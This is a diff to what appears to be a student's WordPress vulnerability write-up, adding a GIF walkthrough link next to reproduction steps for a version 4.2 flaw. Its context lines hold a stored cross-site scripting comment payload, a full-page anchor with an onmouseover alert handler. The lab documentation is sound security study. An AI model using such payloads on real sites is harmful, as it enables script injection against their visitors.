@@ -29,7 +29,7 @@ Time spent: **X** hours spent in total
     - Vulnerability types:
     - Tested in version: 4.2
     - Fixed in version: 4.2.4
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: https://imgur.com/dwgnDan
   - [ ] Steps to recreate: 
   
     1.Comment on a post with this comment <a href='/wp-admin/' title=""             style="position:absolute;top:0;left:0;width:100%;height:100%;display:block;" onmouseover=alert(23)//'>Test</a>
